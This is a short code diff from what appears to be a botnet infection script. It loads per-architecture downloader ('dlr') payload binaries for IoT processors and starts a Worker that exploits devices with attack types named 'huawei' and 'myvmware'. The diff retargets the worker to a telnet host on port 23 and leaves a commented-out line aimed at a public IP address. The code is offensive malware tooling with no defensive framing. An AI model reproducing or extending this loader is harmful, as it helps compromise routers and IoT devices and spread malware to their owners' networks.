@@ -27,7 +27,7 @@ def get_payload_cb(arch):
 
 def main():
     # Import dlr
-    arch_support_list = ["arm", "arm7", "m68k", "mips", "mpsl", "ppc", "sh4", "spc", "x86"]
+    arch_support_list = ["arm", "arm7", "m68k", "mips", "mpsl", "ppc", "sh4", "spc"]
     # arch_support_list = ["x86"]
     for arch in arch_support_list:
         # Load binary to payloads
@@ -38,9 +38,10 @@ def main():
     print("Load binary done")
 
     # Attack_type = ["huawei", "myvmware"]
-    cnddt_wkr = Worker("127.0.0.1", 7777, "myvmware", get_payload_cb)
-    print("Create workder done")
+    # cnddt_wkr = Worker("199.195.200.242", 80, "uc_http", get_payload_cb)
+    cnddt_wkr = Worker("192.168.2.100", 23, "huawei", get_payload_cb)
     cnddt_wkr.run()
+    print("Worker is running")
 
     # TODO: Main loop
     # while True:
